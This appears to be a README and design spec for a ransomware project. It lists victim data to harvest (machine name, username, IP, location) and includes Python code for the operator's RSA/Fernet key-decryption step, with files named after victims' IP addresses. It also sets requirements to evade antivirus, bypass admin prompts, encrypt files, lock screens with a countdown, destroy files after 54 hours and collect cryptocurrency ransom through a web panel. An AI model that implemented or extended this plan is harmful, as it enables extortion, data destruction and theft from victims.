# RW-PROJECT
########################################################################
			PLEASE WORK ON THE FOLLOWING BEFORE GOING TO THROUGH THE MAIN WORK

RUN AS ADMIN

        REQUIRMENTS FROM MACHINE
	MACHINE NAME
	USERNAME
	IP ADDRESS (api.ipify.org)
	LOCATION
	DATE & TIME
	DECRYPTION KEY

I will host the work on a server and will be waiting for the EMAIL_ME.txt on the server,
But instead of EMAIL_ME.txt, I want it to be named after the IP address of the victim, 
Them it will be copied to another file for decryption,


from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from cryptography.fernet import Fernet
import os
import pathlib
import sys

with open('EMAIL_ME.txt', 'rb') as f:
    enc_fernet_key = f.read()
    #print(enc_fernet_key)

# Private RSA key
private_key = RSA.import_key(open('private.pem').read())

# Private decrypter
private_crypter = PKCS1_OAEP.new(private_key)

dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
with open('decrypted_fernet_key.txt', 'wb') as f:
    f.write(dec_fernet_key)

i am expecting files like


e.g.d.b
2.4.6.2
9.5.3.8
112.5464.8876


and i have to but that at the place where EMAIL_ME.txt is 
and also 
instead of decrypted_fernet_key.txt
i should put the filename there but it should start with a "d"
	E.G
de.g.d.b
d2.4.6.2
d9.5.3.8
d112.5464.8876

########################################################################

			REQUIRMENTS
	CROSS PLATFORM
	TIME COUNTER (ON BOTH VICTIMS SCREEN AND ALSO ON WEB PANEL)
	LOCK SCREEN AND WAIT FOR DECRYPTION KEY FOR 48 HOURS AND DISTROY ALL FILES AFTER 54 HOURS (GIVE THE PERSON AN EXTRA TIME OF 6 HOURS)
		
		  	REQUIRMENTS FROM MACHINE
	MACHINE NAME
	USERNAME
	IP ADDRESS (api.ipify.org)
	LOCATION
	DATE & TIME
	DECRYPTION KEY



			ENCRYPTION STAGE
	EXE SHOULD BE ABLE TO DO THE FOLLOWING
BYPASS ALL ANTIVIRUS
BYPASS RUN AS ADMIN
GENERATE PUBLIC AND PRIVATE KEYS
SEEK AND ENCRYPT ALL REQUIRED FILES AND KEEP WAITING FOR DECRYPTION KEY 
			
			
			
			
			DECRYPTION STAGE
	

	
		
			
			
			WEB INTERFACE
	ADMIN PANEL
HAVE ALL REQUIRMENTS FROM MACHINE (REF. REQUIRMENTS FROM MACHINE)
SEARCH BAR, FOR MACHINE ID OR USERNAME


	USER PANEL 
HELP MENU (CONTACT ADMIN ON PROTON MAIL OR ANY ANONYMOUS MAIL SERVER)
FORM TO INPUT YOUR COMPUTER ID OR MACHINE NAME
   AFTER RECIEVING COMPUTER ID OR MACHINE NAME USER SHOULD BE GIVEN DETAILS OF SYSTEM 
   (IP ADDRESS APART FROM DECRYPTION KEY) AND ASKED TO SELECT PREFERED PAYMENT
   BTC, LTC, USDT, ETH.
   SELECTED PREFERED PAYMENT SHOULD GIVE THE USER ONE UNIQUE CRYPTO ADDRESS AND SHOULD BE SUBMITTED WITH DECRYPTION KEY AFTER 1 CONFERMATION.


REF. JASMINE

